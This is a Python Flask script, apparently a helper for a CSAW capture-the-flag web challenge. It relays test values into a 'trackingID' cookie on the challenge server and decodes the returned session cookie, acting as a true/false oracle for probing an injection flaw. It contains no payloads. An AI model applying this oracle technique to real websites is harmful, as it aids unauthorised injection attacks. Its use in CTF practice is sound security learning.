from flask import Flask, request
import json
import base64
import requests


BASE_URL = "http://web.csaw.io:5800/"

app = Flask(__name__)


def check_correctness(value):
    resp = requests.get(BASE_URL, cookies={"trackingID": value})

    session_cookie = resp.cookies["session"]
    if session_cookie.startswith("."):
        return True, resp.text
    json_obj = session_cookie.split(".")[0]

    json_obj = json_obj + "=" * (-len(json_obj) % 4)

    value = base64.b64decode(json_obj.encode("utf-8"))

    json_value = json.loads(value)
    print(json_value)
    if "Error" not in json_value:
        return True, resp.text
    return False, resp.text


@app.route("/exploit")
def exploit():
    value = request.args.get("test", "No value provided")
    print("[+] Testing: " + value)
    correct, resp = check_correctness(value)
    if correct:
        return resp, 200
    return resp, 400


if __name__ == "__main__":
    app.run(debug=False)
